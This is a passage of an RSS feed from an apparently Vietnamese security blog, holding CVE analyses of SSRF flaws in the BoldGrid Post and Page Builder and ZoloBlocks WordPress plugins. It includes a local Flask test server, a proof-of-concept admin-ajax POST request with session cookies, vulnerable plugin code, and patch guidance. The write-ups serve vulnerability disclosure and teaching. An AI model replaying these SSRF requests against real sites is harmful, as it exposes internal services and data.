viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi POST request với URL trỏ đến local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0&#xA;...&#xA;&#xA;action=boldgrid_redirect_url&amp;amp;urls[0]=http://localhost:8001/metadata&amp;amp;boldgrid_gridblock_image_ajax_nonce=482dbb1ed2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#39; alt=&#34;Result&#34; height=&#34;641&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-52713&lt;/strong&gt; xuất phát từ việc hàm &lt;code&gt;get_redirect_url()&lt;/code&gt; trong plugin &lt;strong&gt;BoldGrid Post and Page Builder&lt;/strong&gt; (≤ 1.27.8) gửi yêu cầu HTTP đến URL do người dùng cung cấp mà không kiểm tra hoặc giới hạn, dẫn đến &lt;strong&gt;SSRF&lt;/strong&gt;.&#xA;Kẻ tấn công có quyền &lt;strong&gt;Contributor&lt;/strong&gt; cùng nonce hợp lệ có thể buộc máy chủ gửi request đến các địa chỉ nội bộ.&#xA;Bản vá (1.27.9) khắc phục bằng cách dùng &lt;code&gt;esc_url_raw()&lt;/code&gt; và &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; với giới hạn &lt;code&gt;timeout&lt;/code&gt; và &lt;code&gt;redirection&lt;/code&gt;, ngăn chặn yêu cầu nguy hiểm.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: thiếu xác thực và lọc đầu vào URL.&lt;/li&gt;&#xA;&lt;li&gt;Nonce chỉ chống CSRF, không ngăn SSRF.&lt;/li&gt;&#xA;&lt;li&gt;Mức độ ảnh hưởng: &lt;strong&gt;Low (6.4)&lt;/strong&gt; nhưng có thể dẫn đến rò rỉ dữ liệu nội bộ.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật lên &lt;strong&gt;v1.27.9&lt;/strong&gt; để vá lỗi.&lt;/li&gt;&#xA;&lt;li&gt;Khi phát triển, nên luôn dùng API an toàn (&lt;code&gt;wp_safe_remote_*&lt;/code&gt;) và lọc URL bằng &lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-and-page-builder/vulnerability/wordpress-post-and-page-builder-by-boldgrid-visual-drag-and-drop-editor-plugin-1-27-8-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin &amp;lt;= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-60161 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-31-cve-2025-60161/</link>
      <pubDate>Fri, 31 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-31-cve-2025-60161/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng Server-Side Request Forgery (SSRF) trong BdThemes ZoloBlocks cho phép kẻ tấn công thực hiện yêu cầu giả mạo từ phía máy chủ. Sự cố này ảnh hưởng đến các phiên bản ZoloBlocks từ không xác định cho đến 2.3.11.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-60161&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-60161&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.3.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/zoloblocks/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ZoloBlocks Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;ZoloBlocks&lt;/strong&gt;: &lt;strong&gt;2.3.11&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.3.12&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng này xuất hiện trong tệp &lt;code&gt;TemplatesV1.php&lt;/code&gt;, tuy nhiên tệp này đã bị loại bỏ trong phiên bản vá lỗi.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#34; title=&#34;TemplatesV1.php đã bị loại bỏ trong bản vá&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/removed.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;TemplatesV1.php đã bị loại bỏ trong bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#39; alt=&#34;Diff&#34; height=&#34;466&#34; width=&#34;1550&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;TemplatesV1.php đã bị loại bỏ trong bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function demo_import() {&#xA;    // Kiểm tra tham số đầu vào từ POST&#xA;    if (!isset($_POST[&amp;#39;json_file_url&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No JSON file URL provided&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // Lấy và làm sạch URL người dùng cung cấp&#xA;    $json_file_url = sanitize_text_field(wp_unslash($_POST[&amp;#39;json_file_url&amp;#39;]));&#xA;&#xA;    // Gửi yêu cầu HTTP đến URL đó&#xA;    $response = wp_remote_get($json_file_url, [&amp;#39;timeout&amp;#39; =&amp;gt; 30]);&#xA;&#xA;    // Nếu lỗi khi fetch dữ liệu, trả JSON lỗi&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error(&amp;#39;Failed to fetch JSON data&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // Lấy nội dung phản hồi và giải mã JSON&#xA;    $body    = wp_remote_retrieve_body($response);&#xA;    $data    = json_decode($body, true);&#xA;    $content = $data[&amp;#39;content&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Trả kết quả JSON thành công cùng nội dung import&#xA;    wp_send_json_success([&#xA;        &amp;#39;status&amp;#39;   =&amp;gt; &amp;#39;success&amp;#39;,&#xA;        &amp;#39;message&amp;#39;  =&amp;gt; __(&amp;#39;Pattern imported successfully!&amp;#39;, &amp;#39;zoloblocks&amp;#39;),&#xA;        &amp;#39;content&amp;#39;  =&amp;gt; $content,&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Hàm &lt;code&gt;demo_import()&lt;/code&gt; nhận URL từ người dùng =&amp;gt; gửi yêu cầu HTTP (&lt;code&gt;wp_remote_get&lt;/code&gt;) để tải dữ liệu JSON → giải mã và trả về kết quả qua &lt;code&gt;wp_send_json_success()&lt;/code&gt;.&#xA;Vì không kiểm tra hoặc giới hạn URL, nên có thể bị lợi dụng gây &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;demo_import()&lt;/code&gt; được đăng kí làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_zolo_demo_import&amp;#39;, [$this, &amp;#39;demo_import&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; được sử dụng cho &lt;strong&gt;người dùng chưa đăng nhập&lt;/strong&gt; (anonymous users).&lt;/li&gt;&#xA;&lt;li&gt;Khi client gửi request AJAX đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=zolo_demo_import&lt;/code&gt;, WordPress sẽ gọi hàm &lt;code&gt;demo_import()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 